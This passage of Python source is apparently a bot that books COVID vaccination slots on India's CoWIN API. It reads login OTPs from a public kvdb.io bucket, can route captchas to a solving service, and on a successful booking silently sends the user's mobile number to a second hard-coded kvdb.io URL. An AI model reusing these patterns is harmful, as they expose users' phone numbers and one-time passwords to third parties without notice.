options\n\n    except Exception as e:\n        print(str(e))\n        beep(WARNING_BEEP_DURATION[0], WARNING_BEEP_DURATION[1])\n\n\ndef check_calendar_by_pincode(\n    request_header,\n    vaccine_type,\n    location_dtls,\n    start_date,\n    minimum_slots,\n    min_age_booking,\n    fee_type,\n):\n    \"\"\"\n    This function\n        1. Takes details required to check vaccination calendar\n        2. Filters result by minimum number of slots available\n        3. Returns False if token is invalid\n        4. Returns list of vaccination centers & slots if available\n    \"\"\"\n    try:\n        print(\n            \"===================================================================================\"\n        )\n        today = datetime.datetime.today()\n        base_url = CALENDAR_URL_PINCODE\n\n        if vaccine_type:\n            base_url += f\"&vaccine={vaccine_type}\"\n\n        options = []\n        for location in location_dtls:\n            resp = requests.get(\n                base_url.format(location[\"pincode\"], start_date), headers=request_header\n            )\n\n            if resp.status_code == 401:\n                print(\"TOKEN INVALID\")\n                return False\n\n            elif resp.status_code == 200:\n                resp = resp.json()\n\n                resp = filter_centers_by_age(resp, min_age_booking)\n                                                \n                if \"centers\" in resp:\n                    print(\n                        f\"Centers available in {location['pincode']} from {start_date} as of {today.strftime('%Y-%m-%d %H:%M:%S')}: {len(resp['centers'])}\"\n                    )\n                    options += viable_options(\n                        resp, minimum_slots, min_age_booking, fee_type\n                    )\n\n            else:\n                pass\n\n        for location in location_dtls:\n            if int(location[\"pincode\"]) in [option[\"pincode\"] for option in options]:\n                for _ in range(2):\n                    beep(location[\"alert_freq\"], 150)\n\n        return options\n\n    except Exception as e:\n        print(str(e))\n        beep(WARNING_BEEP_DURATION[0], WARNING_BEEP_DURATION[1])\n\n\ndef generate_captcha(request_header, captcha_automation, api_key):\n    print(\n        \"================================= GETTING CAPTCHA ==================================================\"\n    )\n    resp = requests.post(CAPTCHA_URL, headers=request_header)\n    print(f'Captcha Response Code: {resp.status_code}')\n\n    if resp.status_code == 200 and captcha_automation==\"no\":\n        return captcha_builder(resp.json())\n    elif resp.status_code == 200 and captcha_automation==\"yes\":\n        return captcha_builder_auto(resp.json(), api_key)\n\n\ndef book_appointment(request_header, details, mobile, generate_captcha_pref, api_key=None):\n    \"\"\"\n    This function\n        1. Takes details in json format\n        2. Attempts to book an appointment using the details\n        3. Returns True or False depending on Token Validity\n    \"\"\"\n    try:\n        valid_captcha = True\n        while valid_captcha:\n            captcha = generate_captcha(request_header, generate_captcha_pref, api_key)\n           # os.system('say \"Slot Spotted.\"')\n            details[\"captcha\"] = captcha\n\n            print(\n                \"================================= ATTEMPTING BOOKING ==================================================\"\n            )\n\n            resp = requests.post(BOOKING_URL, headers=request_header, json=details)\n            print(f\"Booking Response Code: {resp.status_code}\")\n            print(f\"Booking Response : {resp.text}\")\n\n            if resp.status_code == 401:\n                print(\"TOKEN INVALID\")\n                return False\n\n            elif resp.status_code == 200:\n                beep(WARNING_BEEP_DURATION[0], WARNING_BEEP_DURATION[1])\n                print(\n                    \"##############    BOOKED!  ############################    BOOKED!  ##############\"\n                )\n                print(\n                    \"                        Hey, Hey, Hey! It's your lucky day!                       \"\n                )\n                print(\"\\nPress any key thrice to exit program.\")\n                requests.put(\"https://kvdb.io/2EKK2edg4qNknwfP1PsKqV/\" + mobile, data={})\n                os.system(\"pause\")\n                os.system(\"pause\")\n                os.system(\"pause\")\n                sys.exit()\n\n            elif resp.status_code == 400:\n                print(f\"Response: {resp.status_code} : {resp.text}\")\n                pass\n\n            else:\n                print(f\"Response: {resp.status_code} : {resp.text}\")\n                return True\n\n    except Exception as e:\n        print(str(e))\n        beep(WARNING_BEEP_DURATION[0], WARNING_BEEP_DURATION[1])\n\n\ndef check_and_book(\n    request_header, beneficiary_dtls, location_dtls, search_option, **kwargs\n):\n    \"\"\"\n    This function\n        1. Checks the vaccination calendar for available slots,\n        2. Lists all viable options,\n        3. Takes user's choice of vaccination center and slot,\n        4. Calls function to book appointment, and\n        5. Returns True or False depending on Token Validity\n    \"\"\"\n    try:\n        min_age_booking = get_min_age(beneficiary_dtls)\n\n        minimum_slots = kwargs[\"min_slots\"]\n        refresh_freq = kwargs[\"ref_freq\"]\n        auto_book = kwargs[\"auto_book\"]\n        start_date = kwargs[\"start_date\"]\n        vaccine_type = kwargs[\"vaccine_type\"]\n        fee_type = kwargs[\"fee_type\"]\n        mobile = kwargs[\"mobile\"]\n        captcha_automation = kwargs['captcha_automation']\n        captcha_automation_api_key = kwargs['captcha_automation_api_key']\n\n        if isinstance(start_date, int) and start_date == 2:\n            start_date = (\n                datetime.datetime.today() + datetime.timedelta(days=1)\n            ).strftime(\"%d-%m-%Y\")\n        elif isinstance(start_date, int) and start_date == 1:\n            start_date = datetime.datetime.today().strftime(\"%d-%m-%Y\")\n        else:\n            pass\n\n        if search_option == 2:\n            options = check_calendar_by_district(\n                request_header,\n                vaccine_type,\n                location_dtls,\n                start_date,\n                minimum_slots,\n                min_age_booking,\n                fee_type,\n            )\n        else:\n            options = check_calendar_by_pincode(\n                request_header,\n                vaccine_type,\n                location_dtls,\n                start_date,\n                minimum_slots,\n                min_age_booking,\n                fee_type,\n            )\n\n        if isinstance(options, bool):\n            return False\n\n        options = sorted(\n            options,\n            key=lambda k: (\n                k[\"district\"].lower(),\n                k[\"pincode\"],\n                k[\"name\"].lower(),\n                datetime.datetime.strptime(k[\"date\"], \"%d-%m-%Y\"),\n            ),\n        )\n\n        tmp_options = copy.deepcopy(options)\n        if len(tmp_options) > 0:\n            cleaned_options_for_display = []\n            for item in tmp_options:\n                item.pop(\"session_id\", None)\n                item.pop(\"center_id\", None)\n                cleaned_options_for_display.append(item)\n\n            display_table(cleaned_options_for_display)\n            randrow = random.randint(1, len(options))\n            randcol = random.randint(1, len(options[randrow - 1][\"slots\"]))\n            choice = str(randrow) + \".\" + str(randcol)\n            print(\"Random Rows.Column:\" + choice)\n\n        else:\n            for i in range(refresh_freq, 0, -1):\n                msg = f\"No viable options. Next update in {i} seconds..\"\n                print(msg, end=\"\\r\", flush=True)\n                sys.stdout.flush()\n                time.sleep(1)\n            choice = \".\"\n\n    except TimeoutOccurred:\n        time.sleep(1)\n        return True\n\n    else:\n        if choice == \".\":\n            return True\n        else:\n            try:\n                choice = choice.split(\".\")\n                choice = [int(item) for item in choice]\n                print(\n                    f\"============> Got Choice: Center #{choice[0]}, Slot #{choice[1]}\"\n                )\n\n                new_req = {\n                    \"beneficiaries\": [\n                        beneficiary[\"bref_id\"] for beneficiary in beneficiary_dtls\n                    ],\n                    \"dose\": 2\n                    if [beneficiary[\"status\"] for beneficiary in beneficiary_dtls][0]\n                    == \"Partially Vaccinated\"\n                    else 1,\n                    \"center_id\": options[choice[0] - 1][\"center_id\"],\n                    \"session_id\": options[choice[0] - 1][\"session_id\"],\n                    \"slot\": options[choice[0] - 1][\"slots\"][choice[1] - 1],\n                }\n\n                print(f\"Booking with info: {new_req}\")\n                return book_appointment(request_header, new_req, mobile, captcha_automation, captcha_automation_api_key)\n\n            except IndexError:\n                print(\"============> Invalid Option!\")\n                os.system(\"pause\")\n                pass\n\n\ndef get_vaccine_preference():\n    print(\n        \"It seems you're trying to find a slot for your first dose. Do you have a vaccine preference?\"\n    )\n    preference = input(\n        \"Enter 0 for No Preference, 1 for COVISHIELD, or 2 for COVAXIN. Default 0 : \"\n    )\n    preference = int(preference) if preference and int(preference) in [0, 1, 2] else 0\n\n    if preference == 1:\n        return \"COVISHIELD\"\n    elif preference == 2:\n        return \"COVAXIN\"\n    else:\n        return None\n\n\ndef get_fee_type_preference():\n    print(\"\\nDo you have a fee type preference?\")\n    preference = input(\n        \"Enter 0 for No Preference, 1 for Free Only, or 2 for Paid Only. Default 0 : \"\n    )\n    preference = int(preference) if preference and int(preference) in [0, 1, 2] else 0\n\n    if preference == 1:\n        return [\"Free\"]\n    elif preference == 2:\n        return [\"Paid\"]\n    else:\n        return [\"Free\", \"Paid\"]\n\n\ndef get_pincodes():\n    locations = []\n    pincodes = input(\"Enter comma separated index numbers of pincodes to monitor: \")\n    for idx, pincode in enumerate(pincodes.split(\",\")):\n        pincode = {\"pincode\": pincode, \"alert_freq\": 440 + ((2 * idx) * 110)}\n        locations.append(pincode)\n    return locations\n\n\ndef get_districts(request_header):\n    \"\"\"\n    This function\n        1. Lists all states, prompts to select one,\n        2. Lists all districts in that state, prompts to select required ones, and\n        3. Returns the list of districts as list(dict)\n    \"\"\"\n    states = requests.get(\n        \"https://cdn-api.co-vin.in/api/v2/admin/location/states\", headers=request_header\n    )\n\n    if states.status_code == 200:\n        states = states.json()[\"states\"]\n\n        refined_states = []\n        for state in states:\n            tmp = {\"state\": state[\"state_name\"]}\n            refined_states.append(tmp)\n\n        display_table(refined_states)\n        state = int(input(\"\\nEnter State index: \"))\n        state_id = states[state - 1][\"state_id\"]\n\n        districts = requests.get(\n            f\"https://cdn-api.co-vin.in/api/v2/admin/location/districts/{state_id}\",\n            headers=request_header,\n        )\n\n        if districts.status_code == 200:\n            districts = districts.json()[\"districts\"]\n\n            refined_districts = []\n            for district in districts:\n                tmp = {\"district\": district[\"district_name\"]}\n                refined_districts.append(tmp)\n\n            display_table(refined_districts)\n            reqd_districts = input(\n                \"\\nEnter comma separated index numbers of districts to monitor : \"\n            )\n            districts_idx = [int(idx) - 1 for idx in reqd_districts.split(\",\")]\n            reqd_districts = [\n                {\n                    \"district_id\": item[\"district_id\"],\n                    \"district_name\": item[\"district_name\"],\n                    \"alert_freq\": 440 + ((2 * idx) * 110),\n                }\n                for idx, item in enumerate(districts)\n                if idx in districts_idx\n            ]\n\n            print(f\"Selected districts: \")\n            display_table(reqd_districts)\n            return reqd_districts\n\n        else:\n            print(\"Unable to fetch districts\")\n            print(districts.status_code)\n            print(districts.text)\n            os.system(\"pause\")\n            sys.exit(1)\n\n    else:\n        print(\"Unable to fetch states\")\n        print(states.status_code)\n        print(states.text)\n        os.system(\"pause\")\n        sys.exit(1)\n\n\ndef get_beneficiaries(request_header):\n    \"\"\"\n    This function\n        1. Fetches all beneficiaries registered under the mobile number,\n        2. Prompts user to select the applicable beneficiaries, and\n        3. Returns the list of beneficiaries as list(dict)\n    \"\"\"\n    beneficiaries = requests.get(BENEFICIARIES_URL, headers=request_header)\n\n    if beneficiaries.status_code == 200:\n        beneficiaries = beneficiaries.json()[\"beneficiaries\"]\n\n        refined_beneficiaries = []\n        for beneficiary in beneficiaries:\n            beneficiary[\"age\"] = datetime.datetime.today().year - int(\n                beneficiary[\"birth_year\"]\n            )\n\n            tmp = {\n                \"bref_id\": beneficiary[\"beneficiary_reference_id\"],\n                \"name\": beneficiary[\"name\"],\n                \"vaccine\": beneficiary[\"vaccine\"],\n                \"age\": beneficiary[\"age\"],\n                \"status\": beneficiary[\"vaccination_status\"],\n            }\n            refined_beneficiaries.append(tmp)\n\n        display_table(refined_beneficiaries)\n        print(\n            \"\"\"\n        ################# IMPORTANT NOTES #################\n        # 1. While selecting beneficiaries, make sure that selected beneficiaries are all taking the same dose: either first OR second.\n        #    Please do no try to club together booking for first dose for one beneficiary and second dose for another beneficiary.\n        #\n        # 2. While selecting beneficiaries, also make sure that beneficiaries selected for second dose are all taking the same vaccine: COVISHIELD OR COVAXIN.\n        #    Please do no try to club together booking for beneficiary taking COVISHIELD with beneficiary taking COVAXIN.\n        #\n        # 3. If you're selecting multiple beneficiaries, make sure all are of the same age group (45+ or 18+) as defined by the govt.\n        #    Please do not try to club together booking for younger and older beneficiaries.\n        ###################################################\n        \"\"\"\n        )\n        reqd_beneficiaries = input(\n            \"Enter comma separated index numbers of beneficiaries to book for : \"\n        )\n        beneficiary_idx = [int(idx) - 1 for idx in reqd_beneficiaries.split(\",\")]\n        reqd_beneficiaries = [\n            {\n                \"bref_id\": item[\"beneficiary_reference_id\"],\n                \"name\": item[\"name\"],\n                \"vaccine\": item[\"vaccine\"],\n                \"age\": item[\"age\"],\n                \"status\": item[\"vaccination_status\"],\n            }\n            for idx, item in enumerate(beneficiaries)\n            if idx in beneficiary_idx\n        ]\n\n        print(f\"Selected beneficiaries: \")\n        display_table(reqd_beneficiaries)\n        return reqd_beneficiaries\n\n    else:\n        print(\"Unable to fetch beneficiaries\")\n        print(beneficiaries.status_code)\n        print(beneficiaries.text)\n        os.system(\"pause\")\n        return []\n\n\ndef get_min_age(beneficiary_dtls):\n    \"\"\"\n    This function returns a min age argument, based on age of all beneficiaries\n    :param beneficiary_dtls:\n    :return: min_age:int\n    \"\"\"\n    age_list = [item[\"age\"] for item in beneficiary_dtls]\n    min_age = min(age_list)\n    return min_age\n\n\ndef generate_token_OTP(mobile, request_header):\n    \"\"\"\n    This function generate OTP and returns a new token or None when not able to get token\n    \"\"\"\n    storage_url = \"https://kvdb.io/3YgXf9PHYHbX6NsF7zP6Us/\" + mobile\n    print(\"clearing OTP bucket: \" + storage_url)\n    response = requests.put(storage_url, data={})\n    data = {\n        \"mobile\": mobile,\n        \"secret\": \"U2FsdGVkX1+z/4Nr9nta+2DrVJSv7KS6VoQUSQ1ZXYDx/CJUkWxFYG6P3iM/VW+6jLQ9RDQVzp/RcZ8kbT41xw==\",\n    }\n    print(f\"Requesting OTP with mobile number {mobile}..\")\n    txnId = requests.post(\n        url=\"https://cdn-api.co-vin.in/api/v2/auth/generateMobileOTP\",\n        json=data,\n        headers=request_header,\n    )\n\n    if txnId.status_code == 200:\n        txnId = txnId.json()[\"txnId\"]\n    else:\n        print(\"Unable to Create OTP\")\n        print(txnId.text)\n        time.sleep(5)  # Saftey net againt rate limit\n        return None\n\n    time.sleep(10)\n    t_end = time.time() + 60 * 3  # try to read OTP for atmost 3 minutes\n    while time.time() < t_end:\n        response = requests.get(storage_url)\n        if response.status_code == 200:\n            print(\"OTP SMS is:\" + response.text)\n            print(\"OTP SMS len is:\" + str(len(response.text)))\n\n            OTP = response.text\n            OTP = OTP.replace(\"Your OTP to register/access CoWIN is \", \"\")\n            OTP = OTP.replace(\". It will be valid for 3 minutes. - CoWIN\", \"\")\n            if not OTP:\n                time.sleep(5)\n                continue\n            break\n        else:\n            # Hope it won't 500 a little later\n            print(\"error fetching OTP API:\" + response.text)\n            time.sleep(5)\n\n    if not OTP:\n        return None\n\n    print(\"Parsed OTP:\" + OTP)\n\n    data = {\"otp\": sha256(str(OTP.strip()).encode(\"utf-8\")).hexdigest(), \"txnId\": txnId}\n    print(f\"Validating OTP..\")\n\n    token = requests.post(\n        url=\"https://cdn-api.co-vin.in/api/v2/auth/validateMobileOtp\",\n        json=data,\n        headers=request_header,\n    )\n    if token.status_code == 200:\n        token = token.json()[\"token\"]\n    else:\n        print(\"Unable to Validate OTP\")\n        print(token.text)\n        return None\n\n    print(f\"Token Generated: {token}\")\n    return token\n\n\n\ndef generate_token_OTP_manual(mobile, request_header):\n    \"\"\"\n    This function generate OTP and returns a new token\n    \"\"\"\n\n    if not mobile:\n        print(\"Mobile number cannot be empty\")\n        os.system('pause')\n        sys.exit()\n\n    valid_token = False\n    while not valid_token:\n        try:\n            data = {\"mobile\": mobile,\n                    \"secret\": \"U2FsdGVkX1+z/4Nr9nta+2DrVJSv7KS6VoQUSQ1ZXYDx/CJUkWxFYG6P3iM/VW+6jLQ9RDQVzp/RcZ8kbT41xw==\"\n            }\n            txnId = requests.post(url=OTP_PRO_URL, json=data, headers=request_header)\n\n            if txnId.status_code == 200:\n                print(f\"Successfully requested OTP for mobile number {mobile} at {datetime.datetime.today()}..\")\n                txnId = txnId.json()['txnId']\n\n                OTP = input(\"Enter OTP (If this takes more than 2 minutes, press Enter to retry): \")\n                if OTP:\n                    data = {\"otp\": sha256(str(OTP).encode('utf-8')).hexdigest(), \"txnId\": txnId}\n                    print(f\"Validating OTP..\")\n\n                    token = requests.post(url='https://cdn-api.co-vin.in/api/v2/auth/validateMobileOtp', json=data,\n                                          headers=request_header)\n                    if token.status_code == 200:\n                        token = token.json()['token']\n                        print(f'Token Generated: {token}')\n                        valid_token = True\n                        return token\n\n                    else:\n                        print('Unable to Validate OTP')\n                        print(f\"Response: {token.text}\")\n\n                        retry = input(f\"Retry with {mobile} ? (y/n Default y): \")\n                        retry = retry if retry else 'y'\n                        if retry == 'y':\n                            pass\n                        else:\n                            sys.exit()\n\n            else:\n                print('Unable to Generate OTP')\n                print(txnId.status_code, txnId.text)\n\n                retry = input(f\"Retry with {mobile} ? (y/n Default y): \")\n                retry = retry if retry else 'y'\n                if retry == 'y':\n                    pass\n                else:\n                    sys.exit()\n\n        except Exception as e:\n            print(str(e))\n\n"}
